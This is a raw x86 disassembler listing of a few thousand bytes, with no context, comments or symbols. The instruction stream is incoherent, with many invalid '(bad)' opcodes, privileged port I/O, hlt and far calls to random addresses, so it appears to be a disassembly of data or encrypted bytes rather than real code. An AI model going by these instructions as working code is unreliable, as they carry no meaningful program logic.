  40303e:	jb     0x402ff6
  403040:	ds lock (bad) 
  403043:	adc    ch,BYTE PTR ds:0x2d194150
  403049:	call   0xcb42:0x9691f1d4
  403050:	mov    gs,eax
  403052:	nop
  403053:	xor    eax,0xac5cae33
  403058:	in     al,0x75
  40305a:	fsubr  DWORD PTR [ebp+0xb]
  40305d:	jb     0x4030a7
  40305f:	mov    DWORD PTR [edx+ebx*2-0x5455476c],ecx
  403066:	pop    ss
  403067:	dec    edi
  403068:	pop    esp
  403069:	ds inc ecx
  40306b:	(bad)  
  40306c:	jne    0x403087
  40306e:	pop    eax
  40306f:	dec    esi
  403070:	and    al,0x77
  403072:	call   0xfcb9:0xbb7dd4dd
  403079:	and    ebp,DWORD PTR [ecx]
  40307b:	std    
  40307c:	dec    edx
  40307d:	pushf  
  40307e:	cdq    
  40307f:	leave  
  403080:	mov    ds:0x22febafd,eax
  403085:	int3   
  403086:	and    eax,0xf5fbbc5c
  40308b:	pushf  
  40308c:	hlt    
  40308d:	inc    eax
  40308e:	cli    
  40308f:	jecxz  0x403016
  403091:	dec    ebx
  403092:	cld    
  403093:	ja     0x4030d4
  403095:	and    al,0x86
  403097:	ins    DWORD PTR es:[edi],dx
  403098:	sub    DWORD PTR [esi+ebx*8-0x10db3dc],eax
  40309f:	dec    ebp
  4030a0:	cwde   
  4030a1:	lods   eax,DWORD PTR ds:[esi]
  4030a2:	and    esp,DWORD PTR [esi+edi*4-0x2]
  4030a6:	rol    BYTE PTR [edx-0xc593ae6],1
  4030ac:	pop    ss
  4030ad:	repz cmp BYTE PTR [edi-0x35],ch
  4030b1:	stos   BYTE PTR es:[edi],al
  4030b2:	dec    eax
  4030b3:	push   0x4a958343
  4030b8:	inc    eax
  4030ba:	add    BYTE PTR [ecx-0x2a7e3dc9],bl
  4030c0:	(bad)  
  4030c1:	retf   0xe425
  4030c4:	imul   esi,DWORD PTR [eax+0x4878ca93],0x73
  4030cb:	and    BYTE PTR [edi+0x3c516eb6],bh
  4030d1:	popa   
  4030d2:	sub    dl,BYTE PTR [esi-0x320a7f7c]
  4030d8:	push   ecx
  4030d9:	scas   al,BYTE PTR es:[edi]
  4030da:	stc    
  4030db:	fstp   TBYTE PTR [eax-0x4fe7a1ce]
  4030e1:	and    eax,0xd86ae731
  4030e6:	sbb    esp,DWORD PTR [eax-0x6350a5e6]
  4030ec:	ror    esi,cl
  4030ee:	sbb    bh,al
  4030f0:	adc    DWORD PTR [edx],eax
  4030f2:	xor    DWORD PTR [ecx-0x65],ebx
  4030f5:	mov    ebp,edi
  4030f7:	ds stc 
  4030f9:	xchg   ecx,eax
  4030fa:	ja     0x403116
  4030fc:	fimul  DWORD PTR [ebx]
  4030fe:	xchg   ebp,eax
  4030ff:	pop    edi
  403100:	stos   DWORD PTR es:[edi],eax
  403101:	cmc    
  403102:	mov    al,ds:0xbe6462cb
  403107:	push   0xe5d43ea6
  40310c:	mov    ebp,0xe8cca394
  403111:	xlat   BYTE PTR ds:[ebx]
  403112:	aad    0x30
  403114:	dec    ebp
  403115:	and    al,0x69
  403117:	outs   dx,BYTE PTR ds:[esi]
  403118:	add    BYTE PTR [ebp+0x372e7f5b],bl
  40311e:	enter  0x5baa,0x60
  403122:	jb     0x4030d8
  403124:	rol    DWORD PTR [eax],0x5e
  403127:	cmc    
  403128:	addr16 pop edi
  40312a:	add    edx,DWORD PTR [edx+0x3ae55327]
  403130:	xor    ah,BYTE PTR [ebp+0x61b58965]
  403136:	or     DWORD PTR [ebx],esi
  403138:	imul   eax,ebp,0xffffffa0
  40313b:	add    DWORD PTR [ebx+0x789e9b89],0xffffffcc
  403142:	jle    0x4030c9
  403144:	in     al,dx
  403145:	daa    
  403146:	(bad)  
  403147:	xchg   esi,eax
  403148:	out    dx,eax
  403149:	push   esi
  40314a:	popa   
  40314b:	mov    bl,0x3f
  40314d:	out    dx,eax
  40314e:	pop    es
  40314f:	(bad)  
  403150:	sub    DWORD PTR [ebp+0x35],ebp
  403153:	stc    
  403154:	jmp    0xa58a4ee5
  403159:	and    ch,BYTE PTR [edi]
  40315b:	inc    esi
  40315c:	and    edx,DWORD PTR [edx+0xc]
  40315f:	and    eax,eax
  403161:	xor    eax,0x1121f8c4
  403166:	loopne 0x40315e
  403168:	push   ebp
  403169:	(bad)  
  40316a:	xlat   BYTE PTR ds:[ebx]
  40316b:	pushf  
  40316c:	stos   BYTE PTR es:[edi],al
  40316d:	(bad)  
  40316e:	adc    ah,dh
  403170:	ins    BYTE PTR es:[edi],dx
  403171:	cmp    ecx,DWORD PTR [eax-0x5c3fb057]
  403177:	mov    al,ds:0xa50fcfe0
  40317c:	xor    al,0x34
  40317e:	scas   eax,DWORD PTR es:[edi]
  40317f:	mov    edx,0x83b1c3b0
  403184:	(bad)  
  403185:	into   
  403186:	mov    gs,WORD PTR [ebx-0x46]
  403189:	cmp    dl,BYTE PTR ds:0x9df0f2b7
  40318f:	adc    eax,0xc47a8f02
  403194:	xchg   ebx,eax
  403195:	jecxz  0x40316b
  403197:	push   0xfffffff0
  403199:	sub    BYTE PTR [edi-0x678d6075],0xa
  4031a0:	jo     0x403171
  4031a2:	fucomp st(2)
  4031a4:	jnp    0x403151
  4031a6:	add    ebx,DWORD PTR [ecx]
  4031a8:	inc    esp
  4031a9:	dec    esi
  4031aa:	adc    eax,0x8806e195
  4031af:	out    dx,al
  4031b0:	pop    edx
  4031b1:	push   edi
  4031b2:	enter  0xb79f,0x6d
  4031b6:	test   eax,0x10fa1b45
  4031bb:	pop    edi
  4031bc:	jg     0x403212
  4031be:	ror    BYTE PTR [ebx-0x29],0x5a
  4031c2:	xchg   esp,eax
  4031c3:	jbe    0x403146
  4031c5:	ffree  st(1)
  4031c7:	shl    DWORD PTR [esi-0x33],1
  4031ca:	rcl    BYTE PTR [edi+0x55],0x9a
  4031ce:	mov    al,0xf2
  4031d0:	aam    0x8e
  4031d2:	adc    ah,dh
  4031d4:	enter  0x8854,0x6a
  4031d8:	cli    
  4031d9:	fisttp QWORD PTR [edx]
  4031db:	add    DWORD PTR ds:0x402fa2a6,edx
  4031e1:	outs   dx,BYTE PTR ds:[esi]
  4031e2:	imul   esi,esp,0xfffffff5
  4031e5:	lods   eax,DWORD PTR ds:[esi]
  4031e6:	jecxz  0x403194
  4031e8:	aam    0x63
  4031ea:	mov    dh,0xb5
  4031ec:	pop    ebx
  4031ed:	jge    0x403217
  4031ef:	push   ebp
  4031f0:	xchg   BYTE PTR [ebp-0x7b052480],ch
  4031f6:	icebp  
  4031f7:	mov    edx,0xc53a3d7a
  4031fc:	jo     0x403224
  4031fe:	icebp  
  4031ff:	xchg   esp,eax
  403200:	int3   
  403201:	add    eax,0x9dc0f5e5
  403206:	jge    0x4031f9
  403208:	mov    DWORD PTR [eax-0x18],ecx
  40320b:	mov    al,ds:0x55a1375c
  403210:	push   eax
  403211:	out    dx,eax
  403212:	packssdw mm1,QWORD PTR [esi]
  403215:	or     eax,0x25d49282
  40321a:	sub    bh,bl
  40321c:	inc    ebp
  40321d:	dec    edx
  40321e:	ret    
  40321f:	mov    dh,0x9c
  403221:	or     al,BYTE PTR ds:0xb1ad15d
  403227:	popa   
  403228:	(bad)  
  403229:	mov    al,ds:0xf516ab05
  40322e:	icebp  
  40322f:	inc    ebx
  403230:	push   esi
  403231:	jne    0x403238
  403233:	or     eax,0x6d8ecb8a
  403238:	inc    esi
  403239:	fbld   TBYTE PTR [edx-0x25]
  40323c:	dec    edx
  40323d:	xchg   esi,eax
  40323e:	loop   0x403219
  403240:	push   ds
  403241:	jne    0x403227
  403243:	mov    ds:0xd87f6c00,eax
  403248:	sub    dl,bl
  40324a:	adc    BYTE PTR [esi+0x37487507],ah
  403250:	sbb    DWORD PTR [edi-0x3947ae4],edi
  403256:	imul   ecx,edx,0x7dc03bbf
  40325c:	jl     0x403268
  40325e:	pop    esp
  40325f:	inc    edx
  403260:	in     eax,0x6
  403262:	add    dh,BYTE PTR ds:0x78cfc924
  403268:	clc    
  403269:	jbe    0x403233
  40326b:	lahf   
  40326c:	adc    BYTE PTR [edi+0x4c60661e],ah
  403272:	jno    0x40322a
  403274:	iret   
  403275:	jmp    0x4032f5
  403277:	mov    edx,0x6eeca100
  40327c:	sub    eax,0xffe7528b
  403281:	adc    ah,BYTE PTR [eax-0x32]
  403284:	xchg   BYTE PTR [eax],dl
  403286:	arpl   WORD PTR [edi+edi*4],ax
  403289:	mov    al,0xe4
  40328b:	retf   
  40328c:	pop    edx
  40328d:	xchg   ebx,eax
  40328e:	push   ds
  40328f:	pop    ebx
  403290:	sbb    eax,0x9fe244be
  403295:	cmp    edi,DWORD PTR [ebx-0xceaaf]
  40329b:	aam    0x97
  40329d:	stc    
  40329e:	xor    BYTE PTR ds:0x3c7d1c5f,bh
  4032a4:	push   esp
  4032a5:	imul   edx,eax,0xfc257796
  4032ab:	jge    0x4032ed
  4032ad:	(bad)  
  4032ae:	adc    esi,DWORD PTR ds:[ecx+0x4a]
  4032b2:	xor    cl,BYTE PTR [eax]
  4032b4:	add    eax,DWORD PTR [eax]
  4032b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b7:	sbb    eax,0xc87a106
  4032bc:	adc    eax,0x6781aa86
  4032c1:	iret   
  4032c2:	adc    al,0x3d
  4032c4:	int3   
  4032c5:	int3   
  4032c6:	es aam 0x91
  4032c9:	jle    0x40324b
  4032cb:	jo     0x403333
  4032cd:	cmc    
  4032ce:	pusha  
  4032cf:	in     al,0x9e
  4032d1:	ret    
  4032d2:	daa    
  4032d3:	lahf   
  4032d4:	jge    0x4032eb
  4032d6:	and    al,0xed
  4032d8:	ret    0x9fa0
  4032db:	addr16 iret 
  4032dd:	(bad)  
  4032de:	(bad)  [edx-0x7a]
  4032e1:	xor    BYTE PTR [ebx+0x707e9304],cl
  4032e7:	inc    ebp
  4032e8:	aas    
  4032e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ea:	sbb    bl,BYTE PTR [ecx+0x16c14f5e]
  4032f0:	or     DWORD PTR [esi+0x38],ecx
  4032f3:	push   edi
  4032f4:	cmp    DWORD PTR [edi+0x3d],ecx
  4032f7:	aam    0xa7
  4032f9:	jne    0x403308
  4032fb:	call   0xe77b60c2
  403300:	push   ebp
  403301:	sub    BYTE PTR [ebp-0x42],dh
  403304:	ficom  DWORD PTR [edx]
  403306:	mov    WORD PTR [eax],cs
  403308:	mov    al,0xfa
  40330a:	pop    esi
  40330b:	sub    cl,ah
  40330d:	push   cs
  40330e:	scas   eax,DWORD PTR es:[edi]
  40330f:	pop    ebp
  403310:	push   ebp
  403311:	xor    ebp,DWORD PTR [ecx]
  403313:	and    BYTE PTR [esi],dl
  403315:	scas   eax,DWORD PTR es:[edi]
  403316:	pop    eax
  403317:	push   ds
  403318:	and    DWORD PTR [ebx+0x48],0x5056b901
  40331f:	rcr    DWORD PTR [esp+edx*4+0xb3b05d0],0x7e
  403327:	jg     0x40336b
  403329:	cmp    BYTE PTR [edx+0x4862db9],0xcb
  403330:	rcl    DWORD PTR [ecx],cl
  403332:	enter  0x39f1,0x25
  403336:	mov    ebx,0xf21dd745
  40333b:	xchg   ebp,eax
  40333c:	fcomp  DWORD PTR [ecx-0x7a]
  40333f:	and    dl,BYTE PTR [edx]
  403341:	xor    edi,0x2e8bf5d7
  403347:	mov    esi,0xf4eb3e49
  40334c:	and    eax,DWORD PTR [ebp+edi*8+0x38]
  403350:	mov    ebp,0x403b0cd5
  403355:	pop    ecx
  403356:	xor    BYTE PTR [eax],dl
  403358:	pushf  
  403359:	cmp    eax,0xcc395793
  40335e:	rol    DWORD PTR [esi-0x7716c7d7],1
  403364:	mov    dl,0x97
  403366:	gs aas 
  403368:	mov    ds:0x5a2b839d,eax
  40336d:	mov    eax,ds:0x489b3e47
  403372:	in     eax,0xf9
  403374:	push   esi
  403375:	ffree  st(0)
  403377:	dec    eax
  403378:	ja     0x403329
  40337a:	inc    ebp
  40337b:	inc    eax
  40337c:	repz popa 
  40337e:	icebp  
  40337f:	ror    al,cl
  403381:	not    DWORD PTR [edx+ebx*8-0x38c2624c]
  403388:	call   0x9297:0xd41d5ce9
  40338f:	push   eax
  403390:	xor    esi,ebx
  403392:	fucomi st,st(6)
  403394:	jg     0x4033f7
  403396:	jl     0x403417
  403398:	mov    ebp,0x683382a0
  40339d:	ficom  WORD PTR [ebp+0x46]
  4033a0:	dec    edi
  4033a1:	mov    ah,BYTE PTR [edx]
  4033a3:	jbe    0x403355
  4033a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a6:	jo     0x40338f
  4033a8:	xor    DWORD PTR [ebp+0x4f7c60b8],ebx
  4033ae:	lods   eax,DWORD PTR ds:[esi]
  4033af:	mov    ch,0xa6
  4033b1:	imul   edi,eax,0x53
  4033b4:	adc    ebp,0x54
  4033b7:	sahf   
  4033b8:	pop    ebp
  4033b9:	push   eax
  4033ba:	test   BYTE PTR [edi],0xc5
  4033bd:	mov    bh,0x69
  4033bf:	ds out 0x92,al
  4033c2:	stc    
  4033c3:	push   edx
  4033c4:	sub    ecx,esp
  4033c6:	pop    edi
  4033c7:	xor    dh,0x61
  4033ca:	cmp    eax,0x3e2b039d
  4033cf:	jns    0x40338f
  4033d1:	std    
  4033d2:	fisub  DWORD PTR [edx]
  4033d4:	and    eax,0xec6627a1
  4033d9:	lea    edi,[ebp+ebx*1-0x556e34cb]
  4033e0:	mov    ch,0x90
  4033e2:	add    edi,DWORD PTR [edi+0x1e]
  4033e5:	(bad)  
  4033e6:	fcomi  st,st(7)
  4033e8:	xchg   BYTE PTR [edx],bl
  4033ea:	cmp    DWORD PTR [edx+esi*1-0x14],edi
  4033ee:	dec    edi
  4033ef:	ja     0x403378
  4033f1:	stos   BYTE PTR es:[edi],al
  4033f2:	ss push 0x6f
  4033f5:	add    eax,0xb56f17ce
  4033fa:	jecxz  0x40341c
  4033fc:	mov    ebx,ebp
  4033fe:	push   esi
  4033ff:	dec    edi
  403400:	aad    0xae
  403402:	push   0x1d
  403404:	into   
  403405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403406:	in     al,0xfa
  403408:	cmp    ch,cl
  40340a:	mov    WORD PTR [eax-0x58b9a055],ds
  403410:	or     dl,ch
  403412:	mov    dh,0x4b
  403414:	sbb    al,0xba
  403416:	leave  
  403417:	int3   
  403418:	cwde   
  403419:	sar    esi,1
  40341b:	cli    
  40341c:	xor    BYTE PTR [esi],ch
  40341e:	push   ss
  40341f:	xchg   esi,eax
  403420:	xchg   BYTE PTR [ebp+0x117bfbf1],al
  403426:	xor    bl,BYTE PTR [ebx]
  403428:	lds    ebx,FWORD PTR [eax+0x8]
  40342b:	aas    
  40342c:	fcom   QWORD PTR [ecx-0x22]
  40342f:	shr    BYTE PTR [ebp+edx*1+0x5c],1
  403433:	imul   ecx,DWORD PTR [ebp-0xae2b504],0x6c426e68
  40343d:	adc    eax,0x5fa2d8b9
  403442:	sar    ebx,1
  403444:	xchg   BYTE PTR [ecx+esi*8],al
  403447:	test   eax,0x97e39880
  40344c:	icebp  
  40344d:	loop   0x403443
  40344f:	xor    dl,dl
  403451:	imul   edi,DWORD PTR [ecx+ecx*2-0x75],0x66
  403456:	or     al,0xc9
  403458:	xor    BYTE PTR [edx+0x31],cl
  40345b:	lods   al,BYTE PTR ds:[esi]
  40345c:	pop    ebp
  40345d:	jle    0x4033e6
  40345f:	xchg   dh,al
  403461:	nop
  403462:	aad    0x9f
  403464:	adc    al,0x49
  403466:	jb     0x40347e
  403468:	fistp  DWORD PTR [ebp-0x148d4ef0]
  40346e:	pop    esi
  40346f:	out    dx,al
  403470:	dec    ebp
  403471:	or     ch,bl
  403473:	inc    eax
  403474:	or     dl,dl
  403476:	cmp    edi,esi
  403478:	sbb    eax,0x6ae03cc9
  40347e:	enter  0x89c3,0x3b
  403482:	mov    ecx,0x769cbd7b
  403487:	aad    0x68
  403489:	retf   0xa08
  40348c:	and    DWORD PTR ds:0xc3c5f8e4,ecx
  403492:	inc    edx
  403494:	jmp    0x4034d4
  403496:	popf   
  403497:	inc    ecx
  403498:	les    ebp,FWORD PTR ds:0x3b74017a
  40349e:	push   edx
  40349f:	pop    edx
  4034a0:	mov    fs,WORD PTR [ebp+edi*4-0x55381c43]
  4034a7:	data16 sti 
  4034a9:	xchg   ebx,eax
  4034aa:	aaa    
  4034ab:	sub    bl,BYTE PTR [edx]
  4034ad:	pop    ds
  4034ae:	add    al,0x87
  4034b0:	out    dx,al
  4034b1:	xchg   esp,eax
  4034b2:	mov    dh,BYTE PTR [esi-0x2b]
  4034b5:	mov    edi,0xb6066663
  4034ba:	jbe    0x4034bb
  4034bc:	lea    ecx,[eax+0x3de9f5fe]
  4034c2:	fs repnz inc edx
  4034c5:	popa   
  4034c6:	add    DWORD PTR [esi],edi
  4034c8:	imul   eax,ebx,0x5e3d0def
  4034ce:	neg    BYTE PTR [edi]
  4034d0:	das    
  4034d1:	xor    BYTE PTR [ecx+0x1e],cl
  4034d4:	and    eax,0x7971c606
  4034d9:	xchg   edi,eax
  4034da:	jl     0x40350a
  4034dc:	push   cs
  4034dd:	ins    BYTE PTR es:[edi],dx
  4034de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034df:	mov    ch,0x8c
  4034e1:	pop    edx
  4034e2:	push   ds
  4034e3:	call   0x565a76d0
  4034e8:	push   0xfffffff9
  4034ea:	gs xchg esi,eax
  4034ec:	push   0xffffffb2
  4034ee:	sbb    BYTE PTR [esi],al
  4034f0:	fldcw  WORD PTR [ebx+0x27]
  4034f3:	cmp    al,0x34
  4034f5:	repnz outs dx,DWORD PTR ds:[esi]
  4034f7:	hlt    
  4034f8:	and    DWORD PTR [ebx+0x4ab8022d],0xffffff8e
  4034ff:	jecxz  0x40355a
  403501:	stos   BYTE PTR es:[edi],al
  403502:	stos   DWORD PTR es:[edi],eax
  403503:	ret    
  403504:	cwde   
  403505:	push   0x6bf1b3c1
  40350a:	rcl    BYTE PTR [ebp+0x4c],1
  40350d:	pop    ebx
  40350e:	adc    eax,0x438afa89
  403513:	inc    esi
  403514:	add    al,0x4d
  403516:	adc    eax,0x6dcd5741
  40351b:	jp     0x4034f8
  40351d:	retf   
  40351e:	jb     0x403520
  403520:	adc    edx,DWORD PTR [edi]
  403522:	retf   0x95ed
  403525:	xchg   ecx,eax
  403526:	sbb    BYTE PTR [esi],bl
  403528:	push   ebp
  403529:	in     eax,dx
  40352a:	mov    bh,0xde
  40352c:	xor    al,0x6a
  40352e:	xor    eax,0xab660e45
  403533:	ret    0x334a
  403536:	adc    BYTE PTR [edx],dh
  403538:	ret    0xa4bc
  40353b:	jns    0x40355d
  40353d:	pop    ss
  40353e:	sar    edi,1
  403540:	ins    BYTE PTR es:[edi],dx
  403541:	retf   0x7e69
  403544:	add    eax,0xf2f12418
  403549:	lods   al,BYTE PTR ds:[esi]
  40354a:	nop
  40354b:	ja     0x403545
  40354d:	repnz arpl WORD PTR [edx-0x640eb960],di
  403554:	and    bl,BYTE PTR [edi+0x4f]
  403557:	jb     0x4035c5
  403559:	mov    ds:0x402bac8c,al
  40355e:	fstp   DWORD PTR [ebx+0xf4a2a52]
  403564:	mov    cl,ch
  403566:	push   0x47
  403568:	outs   dx,BYTE PTR ds:[esi]
  403569:	cld    
  40356a:	addr16 jl 0x4035a4
  40356d:	xchg   esp,eax
  40356e:	in     eax,dx
  40356f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403570:	sbb    BYTE PTR [edi+0x45],cl
  403573:	adc    BYTE PTR [ebp+0x34],ah
  403576:	lock retf 
  403578:	sub    BYTE PTR [esi-0x6b],al
  40357b:	mov    bl,0x5a
  40357d:	lods   eax,DWORD PTR ds:[esi]
  40357e:	(bad)  
  40357f:	lock pusha 
  403581:	pop    esi
  403582:	xchg   esp,eax
  403583:	test   DWORD PTR [eax],ecx
  403585:	jp     0x4035cb
  403587:	inc    edi
  403588:	mov    al,ds:0xd12659fe
  40358d:	fmul   DWORD PTR [esi-0x714017b6]
  403593:	cmp    dh,BYTE PTR [ebx]
  403595:	(bad)  
  403596:	das    
  403597:	sub    al,0xdf
  403599:	sbb    BYTE PTR [edx+0x6b66cd27],bl
  40359f:	xchg   edx,eax
  4035a0:	push   ebx
  4035a1:	pop    esi
  4035a2:	fistp  WORD PTR [ebx-0x64]
  4035a5:	sbb    DWORD PTR [esi-0x47],edi
  4035a8:	jecxz  0x40358a
  4035aa:	pusha  
  4035ab:	loopne 0x40352d
  4035ad:	mov    bl,0x87
  4035af:	iret   
  4035b0:	and    eax,0x302b6e4d
  4035b5:	cld    
  4035b6:	in     eax,0x33
  4035b8:	call   0xa7a4014f
  4035bd:	push   edx
  4035be:	ret    
  4035bf:	icebp  
  4035c0:	xchg   esi,eax
  4035c1:	test   al,0x63
  4035c3:	inc    ebp
  4035c4:	jmp    0x9b588404
  4035c9:	stos   DWORD PTR es:[edi],eax
  4035ca:	dec    ebx
  4035cb:	dec    edi
  4035cc:	out    0xee,al
  4035ce:	push   edi
  4035cf:	loopne 0x4035aa
  4035d1:	mov    eax,ds:0x63b146d7
  4035d6:	outs   dx,BYTE PTR ds:[esi]
  4035d7:	ret    0x5e80
  4035da:	mov    eax,ds:0xaafcdeb
  4035df:	dec    ecx
  4035e0:	jno    0x40364c
  4035e2:	add    al,0x78
  4035e4:	fnstenv [esi+0x73]
  4035e7:	xor    esi,DWORD PTR [ebp+0x25]
  4035ea:	ret    0x843a
  4035ed:	iret   
  4035ee:	data16 ja 0x40359d
  4035f1:	out    0x1a,al
  4035f3:	pop    ecx
  4035f4:	imul   esp,DWORD PTR [edi-0x76],0x67
  4035f8:	or     cl,0x2e
  4035fb:	xlat   BYTE PTR ds:[ebx]
  4035fc:	dec    esp
  4035fd:	mov    ds:0xfb591545,eax
  403602:	dec    eax
  403603:	fiadd  DWORD PTR [esi]
  403605:	retf   0x4795
  403608:	cmp    dl,BYTE PTR [edx+0x23]
  40360b:	fst    st(4)
  40360d:	add    eax,0x1dc80734
  403612:	inc    esp
  403613:	mov    dl,0x42
  403615:	les    edi,FWORD PTR [ebx]
  403617:	mov    bh,0x35
  403619:	pop    esp
  40361a:	ret    0x853e
  40361d:	mov    bl,0x99
  40361f:	mov    ch,0xd5
  403621:	loop   0x4035bc
  403623:	adc    esi,DWORD PTR [ebp+0x74962878]
  403629:	pushf  
  40362a:	sbb    ebx,eax
  40362c:	xlat   BYTE PTR ds:[ebx]
  40362d:	fmul   QWORD PTR [ecx+0x39]
  403630:	inc    esi
  403631:	mov    eax,ds:0x823d78fb
  403636:	sahf   
  403637:	xchg   edi,eax
  403638:	nop
  403639:	fabs   
  40363b:	mov    DWORD PTR ds:0x57ce9de6,ebp
  403641:	repnz push eax
  403643:	clc    
  403644:	jg     0x403607
  403646:	dec    edx
  403647:	sub    ah,ah
  403649:	into   
  40364a:	dec    edx
  40364b:	push   ebp
  40364c:	adc    dl,bh
  40364e:	stc    
  40364f:	xor    BYTE PTR [edi+edi*1+0x53],bl
  403653:	jne    0x403622
  403655:	pop    edi
  403656:	cmp    eax,0xee1e45c6
  40365b:	fisttp QWORD PTR [esi]
  40365d:	out    dx,eax
  40365e:	jp     0x403632
  403660:	sub    eax,0x1a9ef785
  403665:	adc    eax,0x2b229d65
  40366a:	fisttp WORD PTR [edx-0x62f4e76]
  403670:	inc    ebp
  403671:	jle    0x403673
  403673:	arpl   si,dx
  403675:	ss loopne 0x4036ec
  403678:	add    al,bh
  40367a:	int3   
  40367b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40367c:	sub    BYTE PTR [esi-0x2e],ah
  40367f:	nop
  403680:	mov    DWORD PTR [ecx-0x4c05714d],esi
  403686:	in     al,0x9
  403688:	cmp    eax,0xf900f9b5
  40368d:	and    al,0xeb
  40368f:	out    0xeb,eax
  403691:	aaa    
  403692:	jb     0x403622
  403694:	daa    
  403695:	stos   BYTE PTR es:[edi],al
  403696:	iret   
  403697:	nop
  403698:	and    ebx,esi
  40369a:	stos   DWORD PTR es:[edi],eax
  40369b:	xchg   edx,eax
  40369c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40369d:	mov    esp,0x5f2d2d51
  4036a2:	jbe    0x403696
  4036a4:	outs   dx,DWORD PTR ds:[esi]
  4036a5:	in     al,dx
  4036a6:	or     esp,DWORD PTR [edi-0x40]
  4036a9:	bound  eax,QWORD PTR [esi+0x3f]
  4036ac:	pop    ebp
  4036ad:	mov    ebx,0xb535e50e
  4036b2:	aas    
  4036b3:	sbb    esi,0x5ee32e03
  4036b9:	xchg   ebx,eax
  4036ba:	xchg   DWORD PTR [ebp+ebp*2-0x1b],esi
  4036be:	sbb    eax,DWORD PTR [ebx]
  4036c0:	push   esi
  4036c1:	jp     0x4036ae
  4036c3:	add    eax,ebp
  4036c5:	shl    bh,0xad
  4036c8:	or     edx,DWORD PTR [edi+ebx*1-0x60]
  4036cc:	inc    esp
  4036cd:	sbb    BYTE PTR [esi+0x2f],dl
  4036d0:	xor    DWORD PTR [eax-0x1b79adb5],eax
  4036d6:	lds    esi,FWORD PTR [esi]
  4036d8:	out    0x5d,al
  4036da:	in     eax,dx
  4036db:	xchg   ebx,eax
  4036dc:	stc    
  4036dd:	cmp    ecx,edx
  4036df:	adc    eax,0x2fef884c
  4036e4:	mov    edx,0x3abab9b6
  4036e9:	xchg   ebp,eax
  4036ea:	dec    edx
  4036eb:	xor    eax,0xa0bc2fdb
  4036f0:	add    bh,BYTE PTR [ebx+0x64003be5]
  4036f6:	dec    ecx
  4036f7:	and    esp,DWORD PTR ds:0x8cc71bb7
  4036fd:	xlat   BYTE PTR ds:[ebx]
  4036fe:	lea    ebp,[edx]
  403700:	jg     0x4036b4
  403702:	mov    WORD PTR [ebx+0x154a2b32],es
  403708:	and    DWORD PTR [ecx-0x16],edx
  40370b:	int3   
  40370c:	jns    0x40370e
  40370e:	and    al,al
  403710:	sbb    eax,0x2fce6f0c
  403715:	ror    cl,cl
  403717:	adc    ebx,DWORD PTR [eax]
  403719:	mov    esp,ebp
  40371b:	inc    edx
  40371c:	mov    eax,ds:0x8c9c63b0
  403721:	cmp    BYTE PTR [eax-0x10],dh
  403724:	mov    WORD PTR [edx+0x44],ss
  403727:	mov    ebp,0xb1b6fbd0
  40372c:	out    0x4a,al
  40372e:	and    BYTE PTR [ecx],cl
  403730:	push   ecx
  403731:	mov    bl,0xe8
  403733:	imul   edx,eax,0x15
  403736:	dec    ebx
  403737:	imul   edx,DWORD PTR [esi],0x8476a099
  40373d:	scas   eax,DWORD PTR es:[edi]
  40373e:	lock xor DWORD PTR [edi-0x54],0x69199234
  403746:	das    
  403747:	jge    0x403730
  403749:	add    eax,0x44b7f2bf
  40374e:	int    0x1e
  403750:	mov    cl,0x43
  403752:	xchg   ebx,eax
  403753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403754:	aas    
  403755:	lahf   
  403756:	in     eax,dx
  403757:	sahf   
  403758:	ret    
  403759:	ror    ah,0x8a
  40375c:	pop    ecx
  40375d:	and    BYTE PTR [ebp-0x32e9d612],0xd1
  403764:	inc    edx
  403765:	mov    esp,DWORD PTR [ebp-0x37816208]
  40376b:	cmp    eax,0x5878ce49
  403770:	xor    al,0x12
  403772:	jne    0x403750
  403774:	imul   edi,DWORD PTR [ecx],0x5e358211
  40377a:	(bad)  
  40377b:	out    dx,al
  40377c:	into   
  40377d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40377e:	mov    ds:0x10cb110c,eax
  403783:	inc    esi
  403784:	loope  0x4037a3
  403786:	jp     0x4037ff
  403788:	and    cl,BYTE PTR [esi+0x4a356538]
  40378e:	or     al,0xc
  403790:	into   
  403791:	or     dl,BYTE PTR [ebp-0x29206555]
  403797:	push   ecx
  403798:	add    eax,0x90dd6afd
  40379d:	or     DWORD PTR [eax-0x3aaee7f4],ebp
  4037a3:	pop    esp
  4037a4:	inc    ebx
  4037a5:	mov    cl,0x34
  4037a7:	imul   ebx,DWORD PTR [edi+eiz*8-0x3c],0xffffffed
  4037ac:	xor    esp,0x48
  4037af:	ds push ss
  4037b1:	fincstp 
  4037b3:	mov    ebx,0x92b31224
  4037b8:	sub    BYTE PTR [ebp-0x1],0x93
  4037bc:	xchg   ecx,eax
  4037bd:	mov    eax,ds:0xe4ab8d41
  4037c2:	ja     0x40377c
  4037c4:	es push eax
  4037c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c7:	push   ecx
  4037c8:	sub    eax,0x9c552e6e
  4037cd:	push   0x5
  4037cf:	mov    bl,0x96
  4037d1:	mov    cl,0xbd
  4037d3:	jecxz  0x4037a9
  4037d5:	loopne 0x4037dd
  4037d7:	or     DWORD PTR [eax+0x67024359],edi
  4037dd:	(bad)  
  4037de:	stc    
  4037df:	pop    esi
  4037e0:	inc    ebx
  4037e1:	inc    ecx
  4037e2:	mov    BYTE PTR [eax-0x74],bh
  4037e5:	adc    eax,0x9e7c5f28
  4037ea:	add    DWORD PTR [edx-0x7dab93ec],esp
  4037f0:	inc    ebp
  4037f1:	dec    edi
  4037f2:	test   BYTE PTR [edi+0x63],ah
  4037f5:	xchg   esp,eax
  4037f6:	test   al,0xc
  4037f8:	in     eax,0x94
  4037fa:	xchg   esi,eax
  4037fb:	adc    eax,DWORD PTR [eax+0x556e7de0]
  403801:	shl    BYTE PTR [ecx-0x3ccdc767],cl
  403807:	mov    ch,0x5c
  403809:	xor    DWORD PTR [ecx],0x337ee863
  40380f:	sar    DWORD PTR [eax+ebp*2],1
  403812:	std    
  403813:	and    eax,DWORD PTR [eax+0x3a]
